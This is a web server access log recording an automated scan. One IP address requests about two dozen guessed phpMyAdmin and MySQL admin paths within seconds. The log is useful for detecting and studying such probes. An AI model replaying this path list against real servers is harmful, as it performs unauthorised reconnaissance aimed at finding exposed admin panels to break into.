www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:56 -0400] "GET /myadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:56 -0400] "GET /myadmin2/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:56 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:56 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:57 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:57 -0400] "GET /mysqladmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:57 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:57 -0400] "GET /mysql-admin/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:57 -0400] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:58 -0400] "GET /phpadmin/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:58 -0400] "GET /phpmyadmin-old/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:58 -0400] "GET /phpmyadmin0/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:58 -0400] "GET /phpMyAdminold/index.php HTTP/1.1" 302 576 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:58 -0400] "GET /pma-old/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:58 -0400] "GET /phpmyadmin1/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:59 -0400] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 302 590 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:59 -0400] "GET /phpmyadmin2/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:59 -0400] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:59 -0400] "GET /myadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:05:59 -0400] "GET /phpma/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:06:00 -0400] "GET /myadmin2/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:06:00 -0400] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:06:00 -0400] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:06:00 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:06:01 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 218.87.96.161 - - [02/May/2018:21:06:01 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
